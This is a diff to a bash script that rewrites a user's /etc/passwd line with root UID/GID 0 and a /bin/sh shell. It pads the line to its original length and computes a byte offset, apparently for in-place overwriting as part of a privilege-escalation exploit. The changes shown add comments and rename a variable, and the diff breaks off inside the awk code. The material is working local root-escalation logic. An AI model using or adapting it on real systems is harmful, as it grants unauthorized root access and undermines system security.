@@ -1,6 +1,6 @@
 #!/bin/bash
 #
-# Edit /etc/passwd to give user(s) root privileges.
+# Edit /etc/passwd to give user(s) root privileges and default shell /bin/sh.
 #
 # If arguments are passed, they are taken as users to escalate. Otherwise, $USER
 # is assumed instead.
@@ -25,8 +25,12 @@ escalate_user() {
 		return 1
 	fi
 
+	# calculate the byte offset of ${user}'s line in /etc/passwd
 	local offset="$(grep --byte-offset "^$user" /etc/passwd | cut --delimiter=':' --fields=1)"
 
+	# awk script outputs ${user}'s line in /etc/passwd, but modified to have a
+    # UID/GID of 0 (effectively aliasing the account to the root user) and a
+    # default shell of /bin/sh (to work around any potential nologin issues)
 	awk -v FS=':' -v user="$user" '
 			BEGIN {
 				# important constants for script
@@ -35,7 +39,7 @@ escalate_user() {
 
 				# indices of important fields in /etc/passwd
 				i_uid = 3
-				i_guid = 4
+				i_gid = 4
 				i_comment = 5
 				i_shell = 7
 			}
@@ -43,14 +47,14 @@ escalate_user() {
 			$0 ~ "^"user {
 				# calculate padding needed in comment field
 				padding += length($i_uid) - length(root_uid)
-				padding += length($i_guid) - length(root_uid)
+				padding += length($i_gid) - length(root_uid)
 
 				shell_diff = length($i_shell) - length(new_shell)
 				padding += shell_diff > 0 ? shell_diff : 0
 
 				# edit record with root (G)UID, /bin/sh as shell
 				for (i = 1; i <= NF; ++i) {
-					if (i == i_uid || i == i_guid) {
+					if (i == i_uid || i == i_gid) {
 						printf root_uid
 					} else if (i == i_comment) {
 						# pad comment to line up with old end of comment
